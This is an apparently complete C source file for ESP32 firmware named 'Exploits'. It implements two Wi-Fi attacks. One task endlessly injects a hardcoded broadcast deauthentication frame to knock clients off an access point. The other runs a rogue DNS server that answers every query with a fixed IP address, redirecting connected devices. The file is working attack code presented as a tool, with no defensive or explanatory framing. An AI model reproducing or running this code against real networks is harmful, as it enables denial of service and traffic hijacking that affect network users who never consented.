#include "Exploits.h"

#include <arpa/inet.h>
#include <lwip/err.h>
#include <lwip/netdb.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <stdio.h>
#include <string.h>

#include "Injector.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static TaskHandle_t deauthTaskHandle = NULL;
static TaskHandle_t dnsHijackTaskHandle = NULL;
static const uint8_t customIp[] = {172, 217, 28, 1};

/**
 * Subtype (1 byte)
 * Flags (1 byte)
 * Duration (2 bytes)
 * Receiver address (6 bytes)
 * Source address (6 bytes)
 * BSSID (6 bytes)
 * Sequence number (2 bytes)
 * Reason code (2 bytes)
 */
static uint8_t deauth_payload[] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff,
                                   0xff, 0xff, 0xff, 0xbc, 0xc0, 0x0f, 0x7e,
                                   0x76, 0x78, 0xbc, 0xc0, 0x0f, 0x7e, 0x76,
                                   0x78, 0x00, 0x00, 0x07, 0x00};

void exploitsRunDeauth() {
  int number_of_deauths = 0;

  while (1) {
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    injectFrame(deauth_payload, 26);
    printf("{DEAUTH,INJECTED_DEAUTH,%d,}\n", number_of_deauths);
    number_of_deauths++;
  }
}

void exploitsCreateDeauthTask(int channelNumber) {
  esp_wifi_set_channel(channelNumber, WIFI_SECOND_CHAN_NONE);
  xTaskCreatePinnedToCore((TaskFunction_t)exploitsRunDeauth, TASK_DEAUTH_NAME,
                          TASK_DEAUTH_STACK_SIZE, NULL, TASK_DEAUTH_PRIORITY,
                          &deauthTaskHandle, TASK_DEAUTH_CORE_TO_USE);
}

void printDnsQuery(uint8_t *queries, uint8_t query_len) {
  int len = query_len - 12;
  for (int i = 0; i < len; i++) {
    printf("%c", queries[i]);
  }
  printf("\n");
}

void printDnsResponse(uint8_t *buff, int resp_len) {
  for (int i = 0; i < resp_len; i++) {
    printf("%02X", buff[i]);
  }
  printf("\n");
}

void exploitsRunDnsHijackTask(void *pvParameters) {
  int server_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
  if (server_sock < 0) {
    printf("Exploits.exploitsRunDnsHijackTask: Failed to create socket.\n");
    vTaskDelete(NULL);
    return;
  }

  struct sockaddr_in server_addr;
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(53);  // DNS port
  server_addr.sin_addr.s_addr = INADDR_ANY;

  if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) <
      0) {
    printf("Exploits.exploitsRunDnsHijackTask: Failed to bind socket.\n");
    close(server_sock);
    vTaskDelete(NULL);
    return;
  }

  printf("{EXPLOIT,DNS_HIJACK_STARTED,}\n");

  while (1) {
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    uint8_t buffer[2048];

    ssize_t recv_len =
        recvfrom(server_sock, buffer, sizeof(buffer), 0,
                 (struct sockaddr *)&client_addr, &client_addr_len);
    if (recv_len < 0) {
      printf("Exploits.exploitsRunDnsHijackTask: Failed to receive data.\n");
      continue;
    }

    dns_query_t *dns_query = (dns_query_t *)buffer;
    uint8_t queries_buffer[recv_len - 12];
    memcpy(queries_buffer, dns_query->queries_and_answers, recv_len - 12);

    /* Create the DNS response with the IP address of the ESP32 */
    dns_query_answer_t answer = {
        .name = htons(0xc00c),
        .type = htons(0x0001),
        .dns_class = htons(0x0001),
        .ttl = htonl(0x0000003c),
        .data_len = htons(0x0004),
        .address = {customIp[0], customIp[1], customIp[2], customIp[3]},
    };

    uint8_t answer_buffer[sizeof(dns_query_answer_t)];
    memcpy(answer_buffer, &answer, sizeof(dns_query_answer_t));

    dns_query_t final_answer = {
        .transaction_id = dns_query->transaction_id,
        .flags = htons(0x8100),
        .questions = dns_query->questions,
        .answer_rrs = htons(0x0001),
        .authority_rrs = 0x0000,
        .additional_rrs = 0x0000,
        .queries_and_answers = {0},
    };

    /* Craft the response to be sent to the client */
    size_t size_of_queries = sizeof(queries_buffer);
    memcpy(final_answer.queries_and_answers, &queries_buffer, size_of_queries);
    uint8_t *ptr_queries = final_answer.queries_and_answers + size_of_queries;
    memcpy(ptr_queries, &answer_buffer, sizeof(dns_query_answer_t));

    uint8_t payload[recv_len + sizeof(dns_query_answer_t)];
    memcpy(payload, &final_answer, recv_len + sizeof(dns_query_answer_t));

    struct sockaddr_in response_addr;
    response_addr.sin_family = AF_INET;
    response_addr.sin_port = client_addr.sin_port;
    response_addr.sin_addr.s_addr = client_addr.sin_addr.s_addr;

    sendto(server_sock, payload, sizeof(payload), 0,
           (struct sockaddr *)&response_addr, sizeof(response_addr));
  }
}

extern "C" void exploitsCreateDnsHijackTask() {
  xTaskCreatePinnedToCore((TaskFunction_t)exploitsRunDnsHijackTask,
                          TASK_DNS_HIJACK_NAME, TASK_DNS_HIJACK_STACK_SIZE,
                          NULL, TASK_DNS_HIJACK_PRIORITY, &dnsHijackTaskHandle,
                          TASK_DNS_HIJACK_CORE_TO_USE);
}